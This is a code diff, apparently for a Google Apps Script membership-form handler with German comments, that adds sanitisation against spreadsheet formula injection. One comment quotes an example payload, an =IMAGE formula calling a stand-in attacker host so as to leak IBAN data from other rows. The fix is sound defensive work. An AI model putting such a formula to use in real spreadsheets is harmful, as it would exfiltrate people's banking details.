@@ -70,6 +70,12 @@ function doPost(e) {
       return jsonResponse({ success: false, message: 'row fehlt oder ist kein Array' });
     }
 
+    // Formel-Injection verhindern: Eingaben stammen aus dem oeffentlichen
+    // Formular. Ein Wert wie =IMAGE("https://evil/?"&G2) wuerde sonst beim
+    // Oeffnen des Sheets ausgefuehrt und koennte andere Zeilen (IBAN) abfliessen
+    // lassen. Mitgliedsnummer wird danach serverseitig gesetzt.
+    row = row.map(entschaerfeFormel);
+
     var neueMitgliedsnr = naechsteMitgliedsnr(sheet);
     row[MITGLIEDSNR_SPALTE - 1] = neueMitgliedsnr;
 
@@ -121,6 +127,14 @@ function zeileZuTreffer(r) {
     eintritt: r[16],
     gekuendigtJahresende: !!r[0],
   };
+}
+
+/** Stellt Strings, die mit =, +, -, @, Tab oder CR beginnen, ein Apostroph voran (kein Formel-Parsing). */
+function entschaerfeFormel(value) {
+  if (typeof value !== 'string' || value === '') {
+    return value;
+  }
+  return /^[=+\-@\t\r]/.test(value) ? "'" + value : value;
 }
 
 /** Erzwingt Text-Speicherung per fuehrendem Apostroph, damit fuehrende Nullen erhalten bleiben. */
